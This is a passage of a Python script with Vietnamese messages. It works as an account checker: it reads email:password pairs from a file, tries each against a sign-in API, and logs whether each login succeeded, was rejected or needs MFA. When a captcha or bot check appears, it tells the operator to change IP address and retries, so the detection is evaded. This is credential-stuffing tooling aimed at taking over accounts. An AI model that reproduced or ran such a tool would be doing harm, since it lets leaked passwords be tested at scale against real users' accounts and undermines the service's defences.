...
async def login_account(session, email, password):
    print(f"\n{Style.BRIGHT}{'='*20}\n{Fore.CYAN}[*] Đang thử đăng nhập với tài khoản: {email}\n{Style.BRIGHT}{'='*20}")    
    headers = {
    ...
    if tenant_id:
        print(f"{Fore.YELLOW}tenantId: {tenant_id}")
    else:
        print("Không tìm thấy tenantId")

    if client_id:
        print(f"{Fore.YELLOW}clientId: {client_id}")
    else:
    ...
    print(f"{Fore.YELLOW}code_challenge: {code_challenge}")
    ...
    print(f"\n{Style.BRIGHT}--- Kết quả đăng nhập ---")
    if signin_response.status == 200:
        ...
        if signin_data is None:
            unknown_response_detail = "Phản hồi không phải là JSON hợp lệ từ server."
            print(f"{Fore.RED}❌ Đăng nhập thất bại! {unknown_response_detail}")
            log_result("FAILURE", email, password, unknown_response_detail)
            return "FAILURE"

        # Lấy đối tượng signInV2 một cách an toàn
        signInV2_data = signin_data.get("data", {}).get("signInV2") if isinstance(signin_data, dict) else None

        if not signInV2_data:
            unknown_response_detail = "Phản hồi không hợp lệ từ server (không tìm thấy dữ liệu signInV2)."
            print(f"{Fore.RED}❌ Đăng nhập thất bại! {unknown_response_detail}")
            log_result("FAILURE", email, password, unknown_response_detail)
            return "FAILURE"

        if signInV2_data.get("authCode") and signInV2_data["authCode"].get("authCode"):
            auth_code = signInV2_data["authCode"]["authCode"]
            print(f"{Fore.GREEN}✅ Đăng nhập thành công (Nhận được Auth Code)!")
            print(f"{Fore.GREEN}   Auth Code: {auth_code[:15]}...") # In một phần auth code
        ...
        elif signInV2_data.get("errors"):
            errors = signInV2_data["errors"]
            error_messages = []
            ...
            if is_invalid_credentials:
                print(f"{Fore.RED}❌ Đăng nhập thất bại! Sai tài khoản hoặc mật khẩu.")
                log_result("INVALID_CREDENTIALS", email, password, ", ".join(error_messages))
            else:
                print(f"{Fore.RED}❌ Đăng nhập thất bại! Lỗi từ API.")
                print(f"{Fore.RED}   Lỗi: {msg}")
                log_result("FAILURE", email, password, ", ".join(error_messages))
        elif signInV2_data.get("multiFactorInfo"):
            mfa_info = signInV2_data["multiFactorInfo"]
            next_factor = mfa_info.get('nextFactor')
            print(f"{Fore.YELLOW}🟡 Cần xác thực thêm (MFA). Yếu tố tiếp theo: {next_factor}")
            log_result("MFA_REQUIRED", email, password, f"Next Factor: {next_factor}")

            # === Yêu cầu GET đến trang xác thực điện thoại (tùy chọn) ===
            print(f"\n{Style.DIM}--- Thực hiện yêu cầu đến trang xác thực điện thoại ---")
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6,zh-CN;q=0.5,zh;q=0.4',
                'downlink': '10',
        ...
        print(f"{Fore.RED}❌ Đăng nhập thất bại! {error_detail}")
...
async def main():
    ...
    """
    # Khởi tạo colorama, autoreset=True để màu tự trả về mặc định sau mỗi lần print
    init(autoreset=True) 

    # Hỏi người dùng có muốn kích hoạt tính năng dừng khi gặp captcha không
    stop_on_captcha_choice = input(f"{Fore.MAGENTA}Bạn có muốn Active Stop If Have Capcha? (y/n): ").lower()
    ...
    try:
        with open(account_file, 'r', encoding='utf-8') as f:
            for line in f:
                ...
                if len(parts) == 2:
                    accounts_to_process.append(parts)
                else:
                    print(f"{Fore.YELLOW}Dòng không hợp lệ, bỏ qua: '{line}'")
    except FileNotFoundError:
        print(f"{Fore.RED}Lỗi: Không tìm thấy tệp '{account_file}'.")
        # Tạo tệp mẫu
        with open(account_file, 'w', encoding='utf-8') as f:
            f.write("email1@example.com:password123\n")
            f.write("email2@example.com|password456\n")
        print(f"{Fore.YELLOW}Đã tạo một tệp mẫu '{account_file}'. Vui lòng thêm tài khoản của bạn và chạy lại.")
        return

    index = 0
    async with aiohttp.ClientSession() as session:
        while index < len(accounts_to_process):
            email, password = accounts_to_process[index]
            ...
            if status == "BOT_DETECTED" and stop_on_captcha:
                ...
                print("👉 Vui lòng thay đổi địa chỉ IP của bạn trước khi tiếp tục." + Style.BRIGHT + Fore.RED)
                print("="*50)
                retry_choice = input(f"{Fore.MAGENTA}Bạn có muốn thử lại tài khoản này không? (y/n): ").lower()
                if retry_choice == 'y':
                    print(f"{Fore.CYAN}Đang thử lại tài khoản {email}...")
                    session.cookie_jar.clear()
                    continue # Lặp lại vòng lặp với cùng index
